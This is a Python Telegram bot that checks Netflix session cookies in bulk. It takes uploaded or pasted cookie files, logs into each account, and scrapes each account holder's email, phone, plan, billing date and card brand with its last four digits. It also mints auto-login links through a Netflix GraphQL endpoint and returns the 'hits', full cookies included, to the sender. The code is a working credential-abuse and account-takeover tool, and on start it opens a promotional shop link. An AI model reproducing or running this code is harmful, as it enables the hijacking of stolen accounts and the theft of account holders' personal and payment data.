import requests
import re
import time
import os
import threading
import tempfile
import zipfile
import shutil
from datetime import datetime
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import telebot
import webbrowser

webbrowser.open("https://t.me/baroshoping")
init(autoreset=True)

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set!")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

class NetflixBulkChecker:
    def __init__(self, threads=5):
        self.threads = threads
        self.lock = threading.Lock()
        self.stats = {'total':0, 'checked':0, 'hits':0, 'bad':0, 'errors':0, 'start_time':time.time()}
        self.premium_accounts = []
        self.chat_id = None

    def send_telegram(self, message):
        try:
            bot.send_message(self.chat_id, message, disable_web_page_preview=True)
        except:
            pass

    def get_country_flag(self, code):
        flags = {'US':'🇺🇸','GB':'🇬🇧','DE':'🇩🇪','FR':'🇫🇷','ES':'🇪🇸','IT':'🇮🇹','TR':'🇹🇷','BR':'🇧🇷','JP':'🇯🇵','KR':'🇰🇷','IN':'🇮🇳','PL':'🇵🇱','BG':'🇧🇬'}
        return flags.get(code.upper(), '🌍')

    def parse_netscape_cookie(self, text):
        text = text.strip()
        if text.startswith("NetflixId="):
            return {"NetflixId": text.split("NetflixId=", 1)[1].strip()}
        cookies = {}
        for line in text.split('\n'):
            line = line.strip()
            if not line or line.startswith('#'): continue
            parts = line.split('\t')
            if len(parts) >= 7:
                cookies[parts[5]] = parts[6]
        return cookies

    def generate_nftoken(self, cookies_dict):
        try:
            session = requests.Session()
            for name, value in cookies_dict.items():
                session.cookies.set(name, value, domain='.netflix.com', path='/')
            
            payload = {"operationName": "CreateAutoLoginToken", "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"}, "extensions": {"persistedQuery": {"version": 102, "id": "76e97129-f4b5-41a0-a73c-12e674896849"}}}
            headers = {'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13)', 'Accept': 'application/json', 'Content-Type': 'application/json'}
            
            response = session.post('https://android13.prod.ftl.netflix.com/graphql', headers=headers, json=payload, timeout=20)
            if response.status_code == 200:
                data = response.json()
                if data.get('data', {}).get('createAutoLoginToken'):
                    return data['data']['createAutoLoginToken']
            return None
        except:
            return None

    def check_cookie(self, cookie_text, source_name):
        try:
            cookies = self.parse_netscape_cookie(cookie_text)
            if not cookies: return None

            session = requests.Session()
            for k, v in cookies.items():
                session.cookies.set(k, v, domain='.netflix.com', path='/')

            r = session.get('https://www.netflix.com/account/membership', timeout=25, allow_redirects=True)
            if 'login' in r.url.lower(): return None

            html = r.text
            if '"membershipStatus":"CURRENT_MEMBER"' not in html: return None

            result = {
                'email': re.search(r'"emailAddress":"([^"]+)"', html).group(1) if re.search(r'"emailAddress":"([^"]+)"', html) else 'N/A',
                'plan': re.search(r'localizedPlanName.*?"value":"([^"]+)"', html).group(1) if re.search(r'localizedPlanName.*?"value":"([^"]+)"', html) else 'Unknown',
                'country_code': re.search(r'"countryOfSignup":"([^"]+)"', html).group(1) if re.search(r'"countryOfSignup":"([^"]+)"', html) else 'XX',
                'next_billing': re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html).group(1) if re.search(r'"nextBillingDate".*?"value":"([^"]+)"', html) else 'N/A',
                'phone': re.search(r'"phoneNumber":"([^"]+)"', html).group(1) if re.search(r'"phoneNumber":"([^"]+)"', html) else 'N/A',
                'card_brand': re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html).group(1) if re.search(r'"ccPaymentMethodBrandName":"([^"]+)"', html) else 'N/A',
                'last4': re.search(r'"lastFourDigits":"([^"]+)"', html).group(1) if re.search(r'"lastFourDigits":"([^"]+)"', html) else 'N/A',
                'profiles': len(re.findall(r'"profileName"', html)),
                'source': source_name,
                'cookie': cookie_text.strip()
            }

            nftoken = self.generate_nftoken(cookies)
            if nftoken:
                result['login_url'] = f"https://netflix.com/account?nftoken={nftoken}"

            return result

        except:
            return None

    def process_cookie_file(self, file_path, index):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                text = f.read()
        except:
            with self.lock: self.stats['errors'] += 1
            return

        result = self.check_cookie(text, f"file_{index}")
        with self.lock:
            self.stats['checked'] += 1
            progress = int((self.stats['checked'] / self.stats['total']) * 100)
            print(f"\rProcessing: {progress}%", end='', flush=True)

            if result:
                self.stats['hits'] += 1
                self.premium_accounts.append(result)
                
                os.makedirs('hits', exist_ok=True)
                fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
                with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
                    f.write(f"Email: {result['email']}\n")
                    f.write(f"Plan: {result['plan']}\n")
                    f.write(f"Country: {result['country_code']}\n")
                    f.write(f"Next Billing: {result['next_billing']}\n")
                    f.write(f"Phone: {result['phone']}\n")
                    f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
                    f.write(f"Profiles: {result['profiles']}\n")
                    f.write(f"Login URL: {result.get('login_url', 'N/A')}\n\n")
                    f.write("--- FULL COOKIE ---\n")
                    f.write(result['cookie'])

                print(f"\n{Fore.GREEN}[✓] HIT #{self.stats['hits']} Saved → {fname}{Style.RESET_ALL}")

            else:
                self.stats['bad'] += 1

    def start(self, folder):
        files = [os.path.join(root, f) for root, _, fs in os.walk(folder) for f in fs if f.endswith('.txt')]
        if not files:
            print("No cookie files found!")
            return
        self.stats['total'] = len(files)
        print(f"Starting check on {len(files)} files...")

        with ThreadPoolExecutor(max_workers=self.threads) as exe:
            for i, f in enumerate(files, 1):
                exe.submit(self.process_cookie_file, f, i)

        print(f"\n\n✅ Finished! Total Hits: {self.stats['hits']}")

# ====================== BOT ======================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message, "📤 Send **ZIP** or **single .txt file** or paste cookie directly.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    file_name = message.document.file_name.lower()
    
    if file_name.endswith('.zip'):
        bot.reply_to(message, "✅ ZIP received. Checking...")
        mode = "zip"
    elif file_name.endswith('.txt'):
        bot.reply_to(message, "✅ .txt file received. Checking...")
        mode = "txt"
    else:
        bot.reply_to(message, "❌ Only .zip or .txt files allowed.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)

        with tempfile.TemporaryDirectory() as tmp:
            if mode == "zip":
                zip_path = os.path.join(tmp, "input.zip")
                with open(zip_path, "wb") as f: f.write(downloaded)
                extract_dir = os.path.join(tmp, "cookies")
                os.makedirs(extract_dir, exist_ok=True)
                with zipfile.ZipFile(zip_path, 'r') as z:
                    z.extractall(extract_dir)
            else:  # single txt
                extract_dir = tmp
                txt_path = os.path.join(tmp, file_name)
                with open(txt_path, "wb") as f: f.write(downloaded)

            checker = NetflixBulkChecker(threads=5)
            checker.chat_id = str(message.chat.id)
            checker.start(extract_dir)

            if os.path.exists("hits") and os.listdir("hits"):
                hits_zip = os.path.join(tmp, "hits.zip")
                with zipfile.ZipFile(hits_zip, 'w') as z:
                    for root, _, fs in os.walk("hits"):
                        for file in fs:
                            z.write(os.path.join(root, file), file)
                with open(hits_zip, "rb") as f:
                    bot.send_document(message.chat.id, f, caption="🎉 All Hits Saved with Full Cookie!")
                shutil.rmtree("hits", ignore_errors=True)
            else:
                bot.reply_to(message, "❌ No hits found.")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)[:150]}")

# ====================== DIRECT COOKIE IN CHAT ======================
@bot.message_handler(func=lambda m: True)
def handle_direct_cookie(message):
    text = message.text.strip()
    if not text or not ("NetflixId=" in text or "\t" in text):
        return

    bot.reply_to(message, "🔄 Processing cookie...")

    try:
        checker = NetflixBulkChecker()
        checker.chat_id = str(message.chat.id)
        result = checker.check_cookie(text, "direct_chat")

        if result and result.get('login_url'):
            bot.reply_to(message, f"✅ **Direct Login Link**\n\n{result['login_url']}")
            
            os.makedirs('hits', exist_ok=True)
            fname = f"[{result['country_code']}] [{result['email']}] - {result['plan']}.txt"
            with open(f"hits/{fname}", 'w', encoding='utf-8') as f:
                f.write(f"Email: {result['email']}\n")
                f.write(f"Plan: {result['plan']}\n")
                f.write(f"Country: {result['country_code']}\n")
                f.write(f"Next Billing: {result['next_billing']}\n")
                f.write(f"Phone: {result['phone']}\n")
                f.write(f"Card: {result['card_brand']} ••••{result['last4']}\n")
                f.write(f"Profiles: {result['profiles']}\n")
                f.write(f"Login URL: {result['login_url']}\n\n")
                f.write("--- FULL COOKIE ---\n")
                f.write(result['cookie'])
        else:
            bot.reply_to(message, "❌ Invalid or Dead Cookie")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

if __name__ == "__main__":
    print("🚀 Netflix Cookie Checker Bot Started")
    bot.remove_webhook()
    bot.infinity_polling(skip_pending=True)
